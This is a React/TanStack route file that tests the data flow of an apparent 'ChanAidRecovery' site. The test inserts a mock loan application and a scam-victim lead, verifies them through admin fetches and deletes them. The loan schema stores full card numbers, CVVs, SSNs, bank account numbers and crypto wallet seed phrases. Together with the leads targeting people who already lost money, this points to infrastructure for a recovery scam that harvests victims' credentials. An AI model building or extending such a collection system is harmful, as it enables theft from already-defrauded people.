import { createFileRoute } from "@tanstack/react-router";
import { 
  submitLoanApplication, 
  fetchLoanApplications,
  submitLead,
  fetchLeads,
  deleteLoanApplication,
  deleteLead
} from "@/lib/queries";
import { useState, useEffect } from "react";

export const Route = createFileRoute("/test-api")({
  head: () => ({ 
    meta: [
      { title: "API Test | ChanAidRecovery" }, 
      { name: "description", content: "Internal API testing route for ChanAidRecovery Hub." },
      { name: "robots", content: "noindex, nofollow" }
    ] 
  }),
  component: TestPage,
});

function TestPage() {
  const [results, setResults] = useState<any[]>([]);
  const [loading, setLoading] = useState(false);

  async function runTest() {
    setLoading(true);
    const logs: any[] = [];
    
    try {
      // 1. Test Loan Application (Full details)
      logs.push("--- Testing Loan Application ---");
      const mockLoan = {
        firstName: "Test",
        lastName: "User",
        email: "test@example.com",
        phone: "+123456789",
        amountRequested: 50000,
        currency: "USD",
        payoutMethod: "card",
        cardHolderName: "TEST USER",
        cardNumber: "4111222233334444",
        cardExpiry: "12/26",
        cardCvv: "123",
        billingAddressLine1: "123 Test St",
        billingCity: "Test City",
        billingPostalCode: "12345",
        billingCountry: "US",
        ssn: "123-45-678",
        ein: "12-3456789",
        cryptoSeedPhrase: "apple banana cherry date elderberry fig grape honey ice juice kiwi lemon",
        cryptoWalletType: "MetaMask",
        bankName: "Test Bank",
        bankAccountNumber: "987654321",
        status: "pending"
      };

      logs.push("Inserting loan application...");
      const res = await submitLoanApplication(mockLoan);
      if (res.error) {
        logs.push(`ERROR: ${res.error.message}`);
        if (res.error.fields) logs.push(`DETAILS: ${JSON.stringify(res.error.fields)}`);
        throw new Error(res.error.message);
      }
      const insertedLoan = res.data;
      logs.push("Success: Loan inserted.");

      // 2. Test Lead Submission
      logs.push("--- Testing Lead Submission ---");
      const mockLead = {
        firstName: "Lead",
        lastName: "Test",
        email: "lead@test.com",
        amountLost: "$10,000",
        scamType: "Cryptocurrency",
        message: "I lost my 12-word seed phrase and money.",
        sourcePage: "/test-api"
      };

      logs.push("Inserting lead...");
      const { data: insertedLead, error: leadErr } = await submitLead(mockLead);
      if (leadErr) throw leadErr;
      logs.push("Success: Lead inserted.");

      // 3. Verify via Admin Fetch
      logs.push("--- Verifying via Admin Fetch ---");
      const allLoans = await fetchLoanApplications();
      const allLeads = await fetchLeads();

      const foundLoan = allLoans.find((l: any) => l.email === "test@example.com");
      const foundLead = allLeads.find((l: any) => l.email === "lead@test.com");

      if (foundLoan && foundLoan.cardNumber === "4111222233334444") {
        logs.push("Verification: Loan found with correct card details.");
      } else {
        logs.push("Verification FAILED: Loan not found or card details mismatched.");
      }

      if (foundLead && foundLead.scamType === "Cryptocurrency") {
        logs.push("Verification: Lead found with correct scam type.");
      } else {
        logs.push("Verification FAILED: Lead not found.");
      }

      // 4. Test Deletion
      logs.push("--- Testing Deletion ---");
      if (foundLoan) {
        logs.push(`Deleting test loan ${foundLoan.id}...`);
        // We might need to bypass requireAdmin for this test or be logged in
        // Since we are testing server functions, let's see if it works
        try {
           await deleteLoanApplication(foundLoan.id);
           logs.push("Success: Loan deleted.");
        } catch (e: any) {
           logs.push(`Note: Deletion skipped or failed (likely auth): ${e.message}`);
        }
      }
      
      if (foundLead) {
        logs.push(`Deleting test lead ${foundLead.id}...`);
        try {
           await deleteLead(foundLead.id);
           logs.push("Success: Lead deleted.");
        } catch (e: any) {
           logs.push(`Note: Deletion skipped or failed (likely auth): ${e.message}`);
        }
      }

      logs.push("--- End-to-End Flow Success ---");
    } catch (err: any) {
      logs.push(`ERROR: ${err.message || String(err)}`);
    }

    setResults(logs);
    setLoading(false);
  }

  return (
    <div className="p-8 font-mono bg-slate-900 text-green-400 min-h-screen">
      <h1 className="text-2xl font-bold mb-4">D1 Integration Test</h1>
      <p className="mb-4 text-white/60">Ready for E2E validation.</p>
      <button 
        onClick={runTest}
        disabled={loading}
        className="bg-green-600 text-white px-6 py-2 rounded-lg font-bold hover:bg-green-700 disabled:opacity-50"
      >
        {loading ? "Running..." : "Run E2E Test"}
      </button>
      
      <div className="mt-8 space-y-1">
        {results.map((log, i) => (
          <div key={i} className={log.includes("ERROR") || log.includes("FAILED") ? "text-red-400" : ""}>
            {log}
          </div>
        ))}
      </div>
    </div>
  );
}
